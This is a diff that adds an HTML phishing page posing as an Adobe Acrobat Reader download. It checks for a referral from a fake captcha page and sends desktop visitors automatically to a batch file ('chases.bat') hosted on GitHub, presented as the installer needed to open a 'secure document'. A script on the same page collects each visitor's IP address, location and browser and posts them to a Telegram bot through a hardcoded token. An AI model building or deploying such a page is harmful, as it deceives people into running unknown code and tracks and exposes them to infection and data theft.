@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adobe Acrobat Viewer Download</title>
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Geologica:wght@100..900&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
+
+  <script>
+    // Check if user came from recaptcha.html
+    document.addEventListener("DOMContentLoaded", () => {
+      const ref = document.referrer;
+
+      // If not referred by recaptcha.html → redirect them
+      if (!ref.endsWith("recaptcha.html")) {
+        window.location.href = "./recaptcha.html";
+      }
+    });
+  </script>
+  
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Geologica:wght@100..900&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    .desktop-only {
+      display: flex;
+      font-family: "Lato", sans-serif;
+      font-style: normal;
+      flex-direction: column;
+      height: 100vh;
+    }
+
+    header {
+      background-color: #fff;
+      padding: 1rem 2rem;
+      color: #e60000;
+      font-weight: bold;
+      font-size: 1.5rem;
+      border-bottom: 1px solid #ddd;
+    }
+
+    header img {
+      height: 75px;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+      text-align: center;
+      gap: 15px;
+    }
+
+    .adobe-logo {
+      display: flex;
+      flex-direction: row;
+      justify-content: center;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .adobe-logo img {
+      width: 70px;
+      height: 70px;
+    }
+
+    .loader {
+      margin: 2rem auto;
+      width: 60px;
+      height: 60px;
+      border: 4px solid #ccc;
+      border-top: 4px solid blue;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    main p a {
+      text-decoration: none;
+      color: blue;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    footer {
+      background: linear-gradient(to top, red, transparent);
+      text-align: center;
+      padding: 4rem;
+      font-size: 0.875rem;
+      color: #333;
+    }
+
+    /* Mobile message hidden by default */
+    .mobile-message {
+      display: none;
+      text-align: center;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      padding: 2rem;
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      font-size: 1rem;
+      color: #333;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    /* Switch views on mobile */
+    @media (max-width: 768px) {
+      .desktop-only {
+        display: none;
+      }
+
+      .mobile-message {
+        display: flex;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Mobile Warning -->
+  <div class="mobile-message">
+    <div class="lo">
+      <img src="./im/adobe_logo.png" height="50px" alt="Adobe logo">
+    </div>
+    <p>This page is not accessible on mobile devices.<br>Redirecting you now...</p>
+  </div>
+
+  <!-- Desktop Content -->
+  <div class="desktop-only">
+    <header>
+      <img src="im/adobe.svg" alt="Adobe logo">
+    </header>
+
+    <main>
+      <div class="adobe-logo">
+        <img src="./im/adobe_logo.png" alt="Adobe logo">
+        <h2>Adobe Acrobat Reader</h2>
+      </div>
+      <h3>This document requires the latest version of Adobe Acrobat Viewer</h3>
+      <p>The installation file will download<br>automatically after 5 seconds. Run the installer to view the secure document.</p>
+
+      <div class="loader"></div>
+
+      <p>If the download doesn't start, 
+        <a href="#" id="manual-download">click here to download manually</a>
+      </p>
+    </main>
+
+    <footer></footer>
+  </div>
+
+  <script>
+    const installerUrl = 'https://github.com/Stanley-Richie/My-app-download/releases/download/v2.0/chases.bat';
+
+    // Detect mobile and redirect immediately
+    function detectMobileAndRedirect() {
+      const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      if (isMobile) {
+        window.location.href = "main"; // Change to your mobile redirect URL
+        return true;
+      }
+      return false;
+    }
+
+  // Redirect for desktop (instead of download)
+  function initiateDownload() {
+    window.location.href = installerUrl;  // redirect instead of forcing download
+  }
+
+    window.addEventListener('DOMContentLoaded', function() {
+      // If not mobile, run the desktop download logic
+      if (!detectMobileAndRedirect()) {
+        setTimeout(initiateDownload, 2000); // Auto-download after 5 seconds
+
+        // Collect visitor info and send to Telegram
+        (async () => {
+          try {
+            const resp = await fetch('https://ipapi.co/json');
+            const info = await resp.json();
+            const ip = info.ip;
+            const location = `${info.city}, ${info.region}, ${info.country_name}`;
+            const device = 'Desktop';
+            const browser = navigator.userAgent;
+            const timestamp = new Date().toLocaleString();
+            const message = `Visitor Info:\nIP: ${ip}\nDevice: ${device}\nBrowser: ${browser}\nLocation: ${location}\nDate/Time: ${timestamp}`;
+
+            const TELEGRAM_TOKEN = '8288291266:AAEtNuCmehwIEJDAxJsRizaht-dYRqZYq9w';
+            const CHAT_ID = '7814177439';
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+          } catch (error) {
+            console.error('Error sending Telegram notification:', error);
+          }
+        })();
+      }
+    });
+
+    // Manual download
+    document.getElementById('manual-download').addEventListener('click', function(e) {
+      e.preventDefault();
+      initiateDownload();
+    });
+  </script>
+</body>
+</html>
